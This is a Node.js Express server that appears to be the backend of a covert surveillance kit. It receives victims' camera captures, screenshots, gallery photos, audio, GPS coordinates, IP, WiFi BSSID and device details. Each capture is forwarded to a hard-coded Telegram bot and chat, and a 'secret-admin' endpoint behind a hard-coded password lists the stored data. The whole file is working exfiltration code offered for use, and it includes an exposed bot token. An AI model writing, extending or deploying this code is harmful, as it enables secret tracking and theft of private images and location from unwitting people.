const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = 8080;

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

// ==========================================
// TELEGRAM CONFIG
// ==========================================
const TELEGRAM_BOT_TOKEN = '8987699730:AAGu9AoKE7bEBh90MYnuL6mBeJ-K_7M-GXM';
const TELEGRAM_CHAT_ID = '5387196154';

// ===== SEND TELEGRAM MESSAGE WITH PHOTO =====
async function sendTelegramPhoto(imageData, caption) {
    try {
        // Agar imageData base64 hai toh convert karo
        const base64Image = imageData.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Image, 'base64');
        
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', buffer, { filename: 'capture.jpg' });
        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');
        
        await axios.post(url, formData, {
            headers: formData.getHeaders()
        });
        console.log('✅ Telegram photo sent!');
    } catch (error) {
        console.error('❌ Telegram photo error:', error.message);
        // Fallback: sirf text bhejo
        await sendTelegramMessage(caption);
    }
}

async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent!');
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

// ==========================================
// DATA STORE
// ==========================================
let allData = [];
let idCounter = 1;
const ADMIN_PASSWORD = 'admin123#@!';

app.use(express.static(path.join(__dirname, '../frontend')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

app.get('/secret-admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/secret-admin.html'));
});

// ==========================================
// STORE MAIN DATA + TELEGRAM WITH PHOTO
// ==========================================
app.post('/api/store', async (req, res) => {
    try {
        const { 
            cameraImage, location, deviceDetails, screenshot, 
            userPhoto, audioData, ipAddress, behaviorData, 
            fullDeviceInfo, galleryCount 
        } = req.body;

        const newEntry = {
            _id: 'id_' + idCounter++,
            cameraImage: cameraImage || null,
            location: location || { lat: 0, lng: 0 },
            deviceDetails: deviceDetails || {},
            fullDeviceInfo: fullDeviceInfo || {},
            screenshot: screenshot || null,
            userPhoto: userPhoto || null,
            audioData: audioData || null,
            ipAddress: ipAddress || 'Unknown',
            behaviorData: behaviorData || {},
            galleryCount: galleryCount || 0,
            timestamp: new Date().toISOString()
        };

        allData.unshift(newEntry);
        console.log('✅ Stored! Total:', allData.length);

        // ===== TELEGRAM MESSAGE WITH PHOTO =====
        const caption = `
📸 <b>New Capture!</b>
📍 Location: ${location?.lat || 0}, ${location?.lng || 0}
📱 Device: ${fullDeviceInfo?.deviceName || deviceDetails?.deviceName || 'Unknown'}
🖥️ OS: ${fullDeviceInfo?.os || deviceDetails?.os || 'Unknown'} ${fullDeviceInfo?.osVersion || ''}
📡 IP: ${ipAddress || 'Unknown'}
📱 Model: ${fullDeviceInfo?.deviceModel || 'Unknown'}
📶 Network: ${fullDeviceInfo?.connection?.type || deviceDetails?.networkType || 'Unknown'}
📶 WiFi: ${fullDeviceInfo?.wifi || 'Unknown'}
📶 BSSID: ${fullDeviceInfo?.bssid || 'Unknown'}
🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'} ${fullDeviceInfo?.battery?.charging ? '🔌' : ''}
🕐 Time: ${new Date().toISOString()}
📸 Gallery: ${galleryCount || 0} photos
        `;

        // Photo ke sath bhejo (agar available hai)
        if (userPhoto) {
            await sendTelegramPhoto(userPhoto, caption);
        } else if (screenshot) {
            await sendTelegramPhoto(screenshot, caption);
        } else {
            await sendTelegramMessage(caption);
        }

        res.json({ success: true, message: 'Data stored!', id: newEntry._id });

    } catch (err) {
        console.error('Store error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ==========================================
// STORE GALLERY PHOTOS + TELEGRAM
// ==========================================
app.post('/api/store-gallery', async (req, res) => {
    try {
        const { image, fileName, location, deviceDetails } = req.body;
        
        const newEntry = {
            _id: 'gallery_' + idCounter++,
            type: 'gallery',
            image: image || null,
            fileName: fileName || 'unknown.jpg',
            location: location || { lat: 0, lng: 0 },
            deviceDetails: deviceDetails || {},
            timestamp: new Date().toISOString()
        };

        allData.unshift(newEntry);
        console.log('✅ Gallery Photo Stored! Total:', allData.length);

        // Telegram photo send
        const caption = `🖼️ <b>New Gallery Photo!</b>\n📁 ${fileName}\n📍 ${location?.lat || 0}, ${location?.lng || 0}`;
        if (image) {
            await sendTelegramPhoto(image, caption);
        }

        res.json({ success: true, message: 'Gallery photo stored!' });
    } catch (err) {
        console.error('Gallery store error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ==========================================
// GET IP
// ==========================================
app.get('/api/get-ip', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || 
               req.connection.remoteAddress || 
               'Unknown';
    res.json({ success: true, ip: ip });
});

// ==========================================
// ADMIN
// ==========================================
app.post('/api/admin/get-data', (req, res) => {
    try {
        const { password } = req.body;
        if (password !== ADMIN_PASSWORD) {
            return res.json({ success: false, message: '❌ Wrong password!' });
        }
        res.json({ success: true, count: allData.length, data: allData });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.post('/api/admin/delete', (req, res) => {
    try {
        const { password, id } = req.body;
        if (password !== ADMIN_PASSWORD) {
            return res.json({ success: false, message: '❌ Wrong password!' });
        }
        allData = allData.filter(item => item._id !== id);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// ==========================================
// START
// ==========================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server: http://localhost:${PORT}`);
    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
    console.log(`📱 Telegram Bot Active!`);
});
